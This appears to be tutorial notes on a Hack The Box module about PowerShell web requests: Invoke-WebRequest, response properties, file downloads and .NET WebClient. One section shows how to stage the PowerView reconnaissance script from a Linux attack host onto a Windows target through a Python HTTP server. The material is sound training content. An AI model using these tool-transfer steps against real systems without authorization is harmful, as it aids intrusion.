
# Interacting with the Web — PowerShell

---

## Overview

PowerShell allows us to interact with web servers directly from the command line, without opening a browser.

For system administrators, this is useful for automating software downloads, retrieving updates, and managing remote Windows hosts. During authorized penetration tests, the same capabilities allow us to transfer tools, retrieve resources, and interact with web services.

In this section, we will learn how to:

- Make HTTP and HTTPS requests with `Invoke-WebRequest`.
- Inspect web responses and extract specific information.
- Download files using PowerShell.
- Transfer files between a Linux attack host and a Windows target.
- Use the .NET `WebClient` class as an alternative download method.

---

## 1. Invoke-WebRequest

`Invoke-WebRequest` is a PowerShell cmdlet used to send web requests and retrieve responses from web servers.

It supports common HTTP methods, including `GET` and `POST`, and can be used to download files, inspect HTML content, send request headers, and maintain web sessions.

### Discovering Its Functionality

We can inspect the cmdlet's documentation using:

```powershell
Get-Help Invoke-WebRequest
```

To obtain more detailed documentation and examples:

```powershell
Get-Help Invoke-WebRequest -Full
Get-Help Invoke-WebRequest -Examples
```

### Aliases

In Windows PowerShell 5.1, `Invoke-WebRequest` has three commonly used aliases:

| Alias | Cmdlet |
|---|---|
| `iwr` | `Invoke-WebRequest` |
| `wget` | `Invoke-WebRequest` |
| `curl` | `Invoke-WebRequest` |

**Version note:** `iwr` is the standard alias to remember. The availability of `wget` and `curl` as aliases differs between Windows PowerShell 5.1 and PowerShell 7, where external executables may be used instead.

---

## 2. Making an HTTP GET Request

A `GET` request retrieves a resource from a web server.

We can perform one using:

```powershell
Invoke-WebRequest -Uri "https://example.com" -Method GET
```

The `-Uri` parameter specifies the destination, while `-Method` defines the HTTP method.

Since `GET` is the default method, we can also write:

```powershell
Invoke-WebRequest -Uri "https://example.com"
```

### Inspecting the Response Object

Unlike traditional command-line tools that primarily return text, PowerShell returns a structured response object.

We can inspect its properties and methods using `Get-Member`:

```powershell
Invoke-WebRequest -Uri "https://example.com" |
    Get-Member
```

The HTB material demonstrates several useful response properties.

| Property | Description |
|---|---|
| `Content` | The response body. |
| `Headers` | HTTP response headers. |
| `StatusCode` | The numerical HTTP status code. |
| `StatusDescription` | The description associated with the response status. |
| `RawContent` | The HTTP response, including headers and content. |
| `RawContentLength` | The length of the returned content. |
| `Links` | Links extracted from the response. |
| `Images` | Images extracted from parsed HTML in Windows PowerShell 5.1. |
| `Forms` | Forms extracted from parsed HTML in Windows PowerShell 5.1. |

The available properties depend on the PowerShell version and response type.

---

## 3. Filtering Web Responses

We do not always need the complete response from a website. We can retrieve specific properties through PowerShell's object-based pipeline.

### Retrieving Response Headers

HTTP headers contain metadata about a response, such as its content type, server information, and caching configuration.

```powershell
Invoke-WebRequest -Uri "https://example.com" |
    Select-Object -ExpandProperty Headers
```

### Retrieving the Status Code

We can inspect the HTTP status code:

```powershell
Invoke-WebRequest -Uri "https://example.com" |
    Select-Object -ExpandProperty StatusCode
```

For example, `200` indicates that the request succeeded.

### Retrieving the Response Body

We can display the HTML content returned by the server:

```powershell
Invoke-WebRequest -Uri "https://example.com" |
    Select-Object -ExpandProperty Content
```

### Inspecting Images

The HTB material demonstrates accessing the `Images` property:

```powershell
Invoke-WebRequest -Uri "https://example.com" |
    Format-List Images
```

In Windows PowerShell 5.1, this can display information about images extracted from a parsed HTML document, including their `src` attributes.

This parsed-HTML functionality differs in PowerShell 7.

### Inspecting Raw Content

We can also examine the complete raw response:

```powershell
Invoke-WebRequest -Uri "https://example.com" |
    Format-List RawContent
```

The output may contain the HTTP status line, response headers, and HTML content.

For web reconnaissance, these properties help us retrieve specific information without manually reviewing every element of a page.

---

## 4. Downloading Files with Invoke-WebRequest

One of the most useful features of `Invoke-WebRequest` is the ability to download files directly to our Windows host.

We use the `-OutFile` parameter to specify where the downloaded resource should be saved.

### Basic Syntax

```powershell
Invoke-WebRequest -Uri "<URL>" -OutFile "<Destination>"
```

For example, to download a file from a web server:

```powershell
Invoke-WebRequest `
    -Uri "https://example.com/example.txt" `
    -OutFile "C:\Users\Public\example.txt"
```

The command performs two main operations:

1. Requests the resource from the specified URL.
2. Saves the response body to the destination file.

### HTB Example: Downloading PowerView

The HTB material uses PowerView, a PowerShell reconnaissance tool, to demonstrate file downloads.

In an authorized laboratory, we can download its script from the PowerSploit repository:

```powershell
Invoke-WebRequest `
    -Uri "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1" `
    -OutFile "C:\PowerView.ps1"
```

The parameters specify the resource to retrieve and the local destination.

We can verify that the file exists using:

```powershell
Get-Item C:\PowerView.ps1
```

**Important:** Downloading a script does not automatically execute it. We should inspect and verify downloaded code before running it.

---

## 5. Transferring Files from an Attack Host

During an authorized penetration test, we may need to transfer a file from our Linux attack host to a Windows target.

The HTB module demonstrates how to accomplish this using a temporary Python HTTP server and `Invoke-WebRequest`.

### Step 1: Locate the File

On our Linux attack host, we first navigate to the directory containing the file we want to transfer.

```bash
ls
```

The example assumes that `PowerView.ps1` is already present.

### Step 2: Start a Python HTTP Server

We can serve the current directory using Python:

```bash
python3 -m http.server 8000
```

This starts a basic HTTP server on TCP port `8000`.

Files in the current directory can then be requested by other hosts that have network connectivity to our attack machine.

### Step 3: Download the File on Windows

On the Windows target, we can retrieve the hosted file:

```powershell
Invoke-WebRequest `
    -Uri "http://10.10.14.169:8000/PowerView.ps1" `
    -OutFile "C:\PowerView.ps1"
```

Here, `10.10.14.169` represents the Linux attack host, and `8000` is the port used by its Python HTTP server.

### Step 4: Verify the Download

We can confirm that the file was downloaded:

```powershell
Get-Item C:\PowerView.ps1
```

### Understanding the Transfer

```text
Linux attack host                         Windows target
10.10.14.169                              Windows workstation

PowerView.ps1
      |
Python HTTP server
TCP 8000
      |
      |  HTTP GET request
      | <-------------------------------
      |
      |  File response
      | ------------------------------->
                                        C:\PowerView.ps1
```

This approach is useful when we have network access to a Windows machine but want to avoid manually copying files through a graphical interface.

**Security consideration:** Python's basic HTTP server does not provide authentication or encryption. We should use it only in an appropriate laboratory or trusted, isolated environment and stop it when it is no longer needed.

---

## 6. An Alternative: .NET WebClient

If `Invoke-WebRequest` is unavailable or unsuitable, the HTB material introduces the .NET `WebClient` class as another method for downloading files.

PowerShell can interact with .NET classes directly.

### Creating a WebClient Object

We can instantiate a `WebClient` object using:

```powershell
New-Object Net.WebClient
```

The object provides methods for interacting with web resources.

### Downloading a File

The `DownloadFile()` method accepts two arguments:

1. The URL of the resource.
2. The local destination where the file should be saved.

The general syntax is:

```powershell
(New-Object Net.WebClient).DownloadFile(
    "<URL>",
    "<Destination>"
)
```

For example:

```powershell
(New-Object Net.WebClient).DownloadFile(
    "https://example.com/example.txt",
    "example.txt"
)
```

This saves the file to our current working directory.

To save it elsewhere, we specify an absolute destination path.

### Understanding the Command

| Component | Description |
|---|---|
| `New-Object` | Creates an instance of a .NET class. |
| `Net.WebClient` | The .NET class used to interact with web resources. |
| `.DownloadFile()` | Downloads a resource to a local file. |
| First argument | The resource's URL. |
| Second argument | The destination file path. |

We can verify the download using:

```powershell
Get-Item .\example.txt
```

**Version note:** `WebClient` is a legacy .NET API. It remains useful for understanding the Windows PowerShell examples in this module, but modern .NET development generally favors `HttpClient`.

---

## 7. Comparing Download Methods

| Feature | `Invoke-WebRequest` | `.NET WebClient` |
|---|---|---|
| PowerShell cmdlet | Yes | No |
| Direct file downloads | Yes | Yes |
| HTTP requests | Yes | Yes |
| Structured PowerShell response | Yes | Uses .NET objects and methods |
| Inspect response headers | Yes | Supported through .NET functionality |
| Download parameter or method | `-OutFile` | `.DownloadFile()` |
| Main use in this module | Web requests and file transfers | Alternative file download method |

`Invoke-WebRequest` is the principal tool covered in this section because it integrates naturally with PowerShell cmdlets and pipelines.

The .NET alternative demonstrates how we can use classes and methods directly from PowerShell.

---

## 8. Security Considerations

Web requests and file transfers are useful for both legitimate administration and authorized security assessments.

An administrator might use PowerShell to distribute software or retrieve configuration files, while a penetration tester might use it to transfer reconnaissance tools into a laboratory environment.

However, these activities can leave evidence, including:

- Outbound HTTP or HTTPS connections.
- Web server access logs.
- Proxy and firewall records.
- File creation events.
- PowerShell and endpoint security telemetry.

Hosting a file on a machine inside the same network may avoid some Internet-bound traffic, but it does not make the transfer invisible or eliminate host-level logs.

We should also distinguish between **downloading a file** and **executing its contents**. A successful download does not establish that a script is trustworthy or safe to run.

---

## Command Summary

| Command | Purpose |
|---|---|
| `Get-Help Invoke-WebRequest` | Displays documentation for the cmdlet. |
| `Invoke-WebRequest -Uri <URL>` | Sends a web request. |
| `Invoke-WebRequest -Method GET` | Explicitly performs an HTTP GET request. |
| `Get-Member` | Inspects the returned response object's properties and methods. |
| `Format-List Images` | Displays extracted image information when supported. |
| `Format-List RawContent` | Displays the raw HTTP response. |
| `Invoke-WebRequest -OutFile` | Downloads a resource to a local file. |
| `python3 -m http.server 8000` | Starts a basic Python HTTP server. |
| `New-Object Net.WebClient` | Creates a .NET WebClient object. |
| `.DownloadFile()` | Downloads a file using WebClient. |

---

## Key Takeaways

- `Invoke-WebRequest` is PowerShell's primary cmdlet for interacting with websites and web services in this module.
- We can use it to send HTTP requests, inspect web responses, and download files.
- `Get-Member` allows us to explore the properties and methods of the returned response object.
- `-OutFile` specifies where a downloaded resource will be stored.
- We can transfer files from a Linux attack host by serving them with a temporary Python HTTP server and downloading them through PowerShell.
- The .NET `WebClient` class provides an alternative file download mechanism.
- Web requests and file transfers can generate network and endpoint logs, even when performed entirely inside a local network.
